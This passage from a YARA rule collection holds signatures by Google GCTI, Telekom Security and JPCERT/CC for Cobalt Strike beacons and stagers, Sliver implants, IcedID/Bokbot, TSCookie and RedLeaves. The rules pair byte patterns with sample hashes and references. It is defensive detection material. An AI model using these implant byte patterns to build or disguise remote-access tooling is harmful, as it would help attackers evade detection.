                     EB 0A 8B D3 48 8B CF E8 41 21 00 00 48 8B 5C 24 30
                     48 83 C4 20 }
		$decoder = { 80 31 ?? FF C2 48 FF C1 48 63 C2 48 3D 10 06 00 00 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_X64_V3_3
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 3.3"
		author = "gssincla@google.com"
		id = "fb96ecff-809e-5704-974e-a2d8ef022daa"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1070-L1109"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "7b00721efeff6ed94ab108477d57b03022692e288cc5814feb5e9d83e3788580"
		logic_hash = "514d491b8066ed7127ebb152a27efbe65e1121da3b5460afe6987920a91f2863"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 8B D3 48 8B CF E8 89 66 00 00 E9 23 FB FF FF 
                     41 B8 01 00 00 00 E9 F3 FD FF FF 48 8D 0D 2A F8 FF FF
                     E8 8D 2B 00 00 48 8B 5C 24 30 48 83 C4 20 }
		$decoder = { 80 31 ?? FF C2 48 FF C1 48 63 C2 48 3D 10 06 00 00 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_X64_V3_4
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 3.4"
		author = "gssincla@google.com"
		id = "97ef152c-86c7-513c-a881-e7d594d38dcf"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1111-L1148"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "5a4d48c2eda8cda79dc130f8306699c8203e026533ce5691bf90363473733bf0"
		logic_hash = "65aa42265133038f6f568c021c0228440e84e236829af50796a73f6923f46395"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 8B D3 48 8B CF E8 56 6F 00 00 E9 17 FB FF FF
                     41 B8 01 00 00 00 8B D3 48 8B CF E8 41 4D 00 00
                     48 8B 5C 24 30 48 83 C4 20 }
		$decoder = { 80 34 28 ?? 48 FF C0 48 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_X64_V3_5_Hf1_And_V3_5_1
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 3.5-hf1 and 3.5.1"
		author = "gssincla@google.com"
		id = "0c0e87d3-e0e2-5ddc-9d89-5e56443da4b8"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1150-L1189"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "934134ab0ee65ec76ae98a9bb9ad0e9571d80f4bf1eb3491d58bacf06d42dc8d"
		logic_hash = "5cd69554edb91956f4ec4c3c5e55f4cd9c3665656c318220ba3a270c0bb0a690"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 8B D3 48 8B CF E8 38 70 00 00 E9 FD FA FF FF 
                     41 B8 01 00 00 00 8B D3 48 8B CF E8 3F 4D 00 00 
                     48 8B 5C 24 30 48 83 C4 20 5F }
		$decoder = { 80 34 28 ?? 48 FF C0 48 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_X64_V3_6
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 3.6"
		author = "gssincla@google.com"
		id = "9651a1ca-d8ea-5b0b-bcba-a850c2e07791"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1191-L1233"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "92b0a4aec6a493bcb1b72ce04dd477fd1af5effa0b88a9d8283f26266bb019a1"
		logic_hash = "d6aff186a01386992f004cb775d280f9b6e7e16d7ecee662d61e3485b0bc088b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 48 89 5C 24 08 57 48 83 EC 20 41 8B D8 48 8B FA 83 F9 27
                     0F 87 47 03 00 00 0F 84 30 03 00 00 83 F9 14
                     0F 87 A4 01 00 00 0F 84 7A 01 00 00 83 F9 0C
                     0F 87 C8 00 00 00 0F 84 B3 00 00 00 }
		$decoder = { 80 34 28 ?? 48 FF C0 48 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_X64_V3_7
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 3.7"
		author = "gssincla@google.com"
		id = "27fad98a-2882-5c52-af6e-c7dcf5559624"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1235-L1274"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "81296a65a24c0f6f22208b0d29e7bb803569746ce562e2fa0d623183a8bcca60"
		logic_hash = "89499e01acd607b2fbcdd134c74ca4a901c00c7c9cf70dd241cc538c1c0d083a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 48 89 5C 24 08 57 48 83 EC 20 41 8B D8 48 8B FA 83 F9 28
                     0F 87 7F 03 00 00 0F 84 67 03 00 00 83 F9 15
                     0F 87 DB 01 00 00 0F 84 BF 01 00 00 }
		$decoder = { 80 34 28 ?? 48 FF C0 48 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_X64_V3_8
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 3.8"
		author = "gssincla@google.com"
		id = "89809d81-9a8b-5cf3-a251-689bf52e98e0"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1276-L1310"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "547d44669dba97a32cb9e95cfb8d3cd278e00599e6a11080df1a9d09226f33ae"
		logic_hash = "8845b71ce4401fd194eb88f04dbf1f313af8b4853da004e63261ca3158fcb1d4"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 8B D3 48 8B CF E8 7A 52 00 00 EB 0D 45 33 C0 8B D3 48 8B CF
                     E8 8F 55 00 00 }
		$decoder = { 80 34 28 ?? 48 FF C0 48 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_X64_V3_11
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 3.11 (two subversions)"
		author = "gssincla@google.com"
		id = "bf0c7661-2583-5fca-beb5-abb2b50c860d"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1312-L1366"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "64007e104dddb6b5d5153399d850f1e1f1720d222bed19a26d0b1c500a675b1a"
		logic_hash = "9c34b23b659463a0ab92949031a9b3246aa95256d1548b2f0ad53fe3d379997d"
		score = 75
		quality = 85
		tags = ""
		rs2 = "815f313e0835e7fdf4a6d93f2774cf642012fd21ce870c48ff489555012e0047"

	strings:
		$version_sig = { 48 83 EC 20 41 8B D8 48 8B FA 83 F9 2D 0F 87 B2 03 00 00
                     0F 84 90 03 00 00 83 F9 17 0F 87 F8 01 00 00
                     0F 84 DC 01 00 00 83 F9 0E 0F 87 F9 00 00 00
                     0F 84 DD 00 00 00 FF C9 0F 84 C0 00 00 00 83 E9 02
                     0F 84 A6 00 00 00 FF C9 }
		$decoder = {
      80 34 28 ?? 
      48 FF C0
      48 3D 00 10 00 00
      7C F1
    }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_X64_V3_12
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 3.12"
		author = "gssincla@google.com"
		id = "6eeae9f4-96e0-5a98-a8dc-779c916cd968"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1368-L1404"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "8a28b7a7e32ace2c52c582d0076939d4f10f41f4e5fa82551e7cc8bdbcd77ebc"
		logic_hash = "7457b20f2a7dc7e8c3317cedbcfccae30ecc8dc164188c0321f9485fdfab0f6e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 8B D3 48 8B CF E8 F8 2E 00 00 EB 16 8B D3 48 8B CF
                     E8 00 5C 00 00 EB 0A 8B D3 48 8B CF E8 64 4F 00 00 }
		$decoder = { 80 34 28 ?? 48 FF C0 48 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_X64_V3_13
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 3.13"
		author = "gssincla@google.com"
		id = "202eb8ea-7afb-515b-9306-67514abf5e55"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1407-L1440"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "945e10dcd57ba23763481981c6035e0d0427f1d3ba71e75decd94b93f050538e"
		logic_hash = "81571a6c30802430d0df9980e005736d58464bde98c0889b48bf8d0c7e88d247"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 48 8D 0D 01 5B FF FF 48 83 C4 28 E9 A8 54 FF FF 8B D0
                     49 8B CA E8 22 55 FF FF }
		$decoder = { 80 34 28 ?? 48 FF C0 48 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_X64_V3_14
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 3.14"
		author = "gssincla@google.com"
		id = "d69171e3-86f4-5187-8874-5eee2045f746"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1442-L1477"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "297a8658aaa4a76599a7b79cb0da5b8aa573dd26c9e2c8f071e591200cf30c93"
		logic_hash = "87cf465154d4294eeda9cf99c6c160da80cfa8a65244bc083737c0c87163431d"
		score = 75
		quality = 85
		tags = ""
		rs2 = "39b9040e3dcd1421a36e02df78fe031cbdd2fb1a9083260b8aedea7c2bc406bf"

	strings:
		$version_sig = { 8B D0 49 8B CA 48 83 C4 28 E9 B1 1F 00 00 8B D0 49 8B CA
                     48 83 C4 28 }
		$decoder = { 80 34 28 ?? 48 FF C0 48 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beacon_Dll_X86_V4_0_Suspected
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 4.0 (suspected, not confirmed)"
		author = "gssincla@google.com"
		id = "28a735c4-87d1-5e14-9379-46a6fd0cdd2a"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1480-L1515"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "55aa2b534fcedc92bb3da54827d0daaa23ece0f02a10eb08f5b5247caaa63a73"
		logic_hash = "0dbf6a75dc74f4c2a7604072a01e2dbaaee15f5e57c765f24138d85c248fb305"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 41 B8 01 00 00 00 8B D0 49 8B CA 48 83 C4 28 E9 D1 B3 FF FF
                     8B D0 49 8B CA 48 83 C4 28 E9 AF F5 FF FF 45 33 C0
                     4C 8D 0D 8D 70 FF FF 8B D0 49 8B CA E8 9B B0 FF FF }
		$decoder = { 80 34 28 ?? 48 FF C0 48 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beacon_X64_V4_1_And_V_4_2
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 4.1 and 4.2"
		author = "gssincla@google.com"
		id = "dc320d17-98fc-5df3-ba05-4d134129317e"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1517-L1553"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "29ec171300e8d2dad2e1ca2b77912caf0d5f9d1b633a81bb6534acb20a1574b2"
		logic_hash = "9b262ec18f79ab5ae63ad26d3685af088b5feb2d66de6ad3ba584cafbe2ee221"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 83 F9 34 0F 87 8E 03 00 00 0F 84 7A 03 00 00 83 F9 1C 0F 87 E6 01 00 00
                     0F 84 D7 01 00 00 83 F9 0E 0F 87 E9 00 00 00 0F 84 CE 00 00 00 FF C9
                     0F 84 B8 00 00 00 83 E9 02 0F 84 9F 00 00 00 FF C9 }
		$decoder = { 80 34 28 ?? 48 FF C0 48 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beacon_X64_V4_3
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Version 4.3"
		author = "gssincla@google.com"
		id = "572616c7-d1ec-5aa1-b142-4f2edf73737f"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1555-L1590"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "3ac9c3525caa29981775bddec43d686c0e855271f23731c376ba48761c27fa3d"
		logic_hash = "0c8934e997583339145749a3167ac010d8c77b2ed878d2c999de68ec2a98101d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 8B D0 49 8B CA 48 83 C4 28 E9 D3 88 FF FF
                     4C 8D 05 84 6E FF FF 8B D0 49 8B CA 48 83 C4 28 }
		$decoder = { 80 34 28 ?? 48 FF C0 48 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beacon_X64_V4_4_V_4_5_And_V4_6
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 4.4 through at least 4.6"
		author = "gssincla@google.com"
		id = "79b6bfd4-1e45-5bd9-ac5c-19eb176ce698"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1593-L1628"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "3280fec57b7ca94fd2bdb5a4ea1c7e648f565ac077152c5a81469030ccf6ab44"
		logic_hash = "be0bbf58a176f8089924b3ce58268d906f49dde51d863524971e46f4bada43a3"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 8B D0 49 8B CA 48 83 C4 28 E9 83 88 FF FF
                     4C 8D 05 A4 6D FF FF 8B D0 49 8B CA 48 83 C4 28 }
		$decoder = { 80 34 28 ?? 48 FF C0 48 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beacon_X64_V4_5_Variant
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 4.5 (variant)"
		author = "gssincla@google.com"
		id = "45715da9-8f16-5304-b216-1ca36c508c77"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1630-L1665"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "8f0da7a45945b630cd0dfb5661036e365dcdccd085bc6cff2abeec6f4c9f1035"
		logic_hash = "31a108168489a24d1bc297d722741f3fd19abd1bed4c76d54967c73986d18123"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 41 B8 01 00 00 00 8B D0 49 8B CA 48 83 C4 28 E9 E8 AB FF FF
                     8B D0 49 8B CA E8 1A EB FF FF 48 83 C4 28 }
		$decoder = { 80 34 28 ?? 48 FF C0 48 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Dnsstager_Bin_V1_47_Through_V4_X
{
	meta:
		description = "Cobalt Strike's resources/dnsstager.bin signature for versions 1.47 to 4.x"
		author = "gssincla@google.com"
		id = "e1b0e368-9bcf-5d9b-b2b3-8414742f213e"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Dnsstager_Bin_v1_47_through_v4_x.yara#L17-L78"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "10f946b88486b690305b87c14c244d7bc741015c3fef1c4625fa7f64917897f1"
		logic_hash = "d4500d8a83a821e1df9e808b17a87c1207d78ea0e03886544a632176fe93ccd0"
		score = 75
		quality = 83
		tags = ""

	strings:
		$apiLocator = {
			31 ?? 
			AC
			C1 ?? 0D 
			01 ?? 
			38 ?? 
			75 ?? 
			03 [2]
			3B [2]
			75 ?? 
			5? 
			8B ?? 24 
			01 ?? 
			66 8B [2]
			8B ?? 1C 
			01 ?? 
			8B ?? 8B 
			01 ?? 
			89 [3]
			5? 
			5? 
		}
		$dnsapi = { 68 64 6E 73 61 }

	condition:
		$apiLocator and $dnsapi
}

rule GCTI_Cobaltstrike_Resources_Smbstager_Bin_V2_5_Through_V4_X
{
	meta:
		description = "Cobalt Strike's resources/smbstager.bin signature for versions 2.5 to 4.x"
		author = "gssincla@google.com"
		id = "074b7d83-e3d8-541c-804b-2417c21f54d5"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Smbstager_Bin_v2_5_through_v4_x.yara#L17-L95"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "946af5a23e5403ea1caccb2e0988ec1526b375a3e919189f16491eeabc3e7d8c"
		logic_hash = "b0f6535069df16a64de44ca0638ec060c1ff264a7820c94710d61ca7e8474450"
		score = 75
		quality = 85
		tags = ""

	strings:
		$apiLocator = {
			31 ?? 
			AC
			C1 ?? 0D 
			01 ?? 
			38 ?? 
			75 ?? 
			03 [2]
			3B [2]
			75 ?? 
			5? 
			8B ?? 24 
			01 ?? 
			66 8B [2]
			8B ?? 1C 
			01 ?? 
			8B ?? 8B 
			01 ?? 
			89 [3]
			5? 
			5? 
		}
		$smb = { 68 C6 96 87 52 }
		$smbstart = {
			6A 40
			68 00 10 00 00
			68 FF FF 07 00
			6A 00
			68 58 A4 53 E5
		}

	condition:
		$apiLocator and $smb and $smbstart
}

rule GCTI_Sliver_Implant_32Bit
{
	meta:
		description = "Sliver 32-bit implant (with and without --debug flag at compile)"
		author = "gssincla@google.com"
		id = "6bc4d7d1-64cf-5920-8f07-54a8a7a94f26"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/Sliver/Sliver__Implant_32bit.yara#L17-L81"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "911f4106350871ddb1396410d36f2d2eadac1166397e28a553b28678543a9357"
		logic_hash = "5b394a198f691b6777438a69d20a423798525daa84a09a0ce346eca5bb66f850"
		score = 60
		quality = 35
		tags = ""

	strings:
		$s_tcppivot = { 81 ?? 74 63 70 70 [2-20] 81 ?? 04 69 76 6F 74  }
		$s_wg = { 66 81 ?? 77 67 }
		$s_dns = { 66 81 ?? 64 6E [2-20] 80 ?? 02 73 }
		$s_http = { 81 ?? 68 74 74 70 }
		$s_https = { 81 ?? 68 74 74 70 [2-20] 80 ?? 04 73 }
		$s_mtls = { 81 ?? 6D 74 6C 73 }
		$fp1 = "cloudfoundry" ascii fullword

	condition:
		4 of ( $s* ) and not 1 of ( $fp* )
}

rule GCTI_Sliver_Implant_64Bit
{
	meta:
		description = "Sliver 64-bit implant (with and without --debug flag at compile)"
		author = "gssincla@google.com"
		id = "b84db933-0e11-5871-821d-43697c015665"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/Sliver/Sliver__Implant_64bit.yara#L17-L84"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "2d1c9de42942a16c88a042f307f0ace215cdc67241432e1152080870fe95ea87"
		logic_hash = "ad4ceef08a732174c8ccbcacf0370b26acb9e5ec0784d8827c8104618e018a26"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s_tcppivot = { 48 ?? 74 63 70 70 69 76 6F 74 }
		$s_namedpipe = { 48 ?? 6E 61 6D 65 64 70 69 70 [2-32] 80 ?? 08 65 }
		$s_https = { 81 ?? 68 74 74 70 [2-32] 80 ?? 04 73 }
		$s_wg = {66 81 ?? 77 67}
		$s_dns = { 66 81 ?? 64 6E [2-20] 80 ?? 02 73 }
		$s_mtls = {  81 ?? 6D 74 6C 73  }
		$fp1 = "cloudfoundry" ascii fullword

	condition:
		5 of ( $s* ) and not 1 of ( $fp* )
}

rule TELEKOM_SECURITY_Fake_Gzip_Bokbot_202104
{
	meta:
		description = "fake gzip provided by CC"
		author = "Thomas Barabosch, Telekom Security"
		id = "538d84d8-aff2-571c-ba60-102f18262434"
		date = "2021-04-20"
		modified = "2021-07-08"
		reference = "https://github.com/telekom-security/malware_analysis/"
		source_url = "https://github.com/telekom-security/malware_analysis//blob/bf832d97e8fd292ec5e095e35bde992a6462e71c/icedid/icedid_20210507.yar#L1-L11"
		license_url = "N/A"
		logic_hash = "0f0205234eae1b011b899a59e4430c2de9d913b05efee90ce844a06f1cff04f3"
		score = 75
		quality = 70
		tags = ""

	strings:
		$gzip = {1f 8b 08 08 00 00 00 00 00 00 75 70 64 61 74 65}

	condition:
		$gzip at 0
}

rule JPCERTCC_Tscookie_1
{
	meta:
		description = "detect TSCookie in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "5407a5c9-2fc5-5b9b-977f-81384a343d15"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://blogs.jpcert.or.jp/en/2018/03/malware-tscooki-7aa0.html"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L8-L21"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "71e51ceb51cff25abefd698ce33f32388cc28ad5936f30fbbb9925d9af79ad85"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "6d2f5675630d0dae65a796ac624fb90f42f35fbe5dec2ec8f4adce5ebfaabf75"

	strings:
		$v1 = "Mozilla/4.0 (compatible; MSIE 8.0; Win32)" wide
		$b1 = { 68 D4 08 00 00 }

	condition:
		all of them
}

rule JPCERTCC_TSC_Loader
{
	meta:
		description = "detect TSCookie Loader in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "378cc8a3-6a76-50d1-b1d2-1a6ca1a75a46"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L23-L35"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "c825253ba897f0f7310162d0473e645dc40b421e9251977384cca2fdc735f7a8"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v1 = "Mozilla/4.0 (compatible; MSIE 8.0; Win32)" wide
		$b1 = { 68 78 0B 00 00 }

	condition:
		all of them
}

rule JPCERTCC_Redleaves
{
	meta:
		description = "detect RedLeaves in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "e17a85de-6a15-5de5-ba9e-03ac6d896d7d"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://blogs.jpcert.or.jp/en/2017/05/volatility-plugin-for-detecting-redleaves-malware.html"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L53-L66"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "c79815dd26070184688d43b336dc2be07df5e2236e60c8ecc42f5efec2cab190"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory block scan"
		hash1 = "5262cb9791df50fafcb2fbd5f93226050b51efe400c2924eecba97b7ce437481"
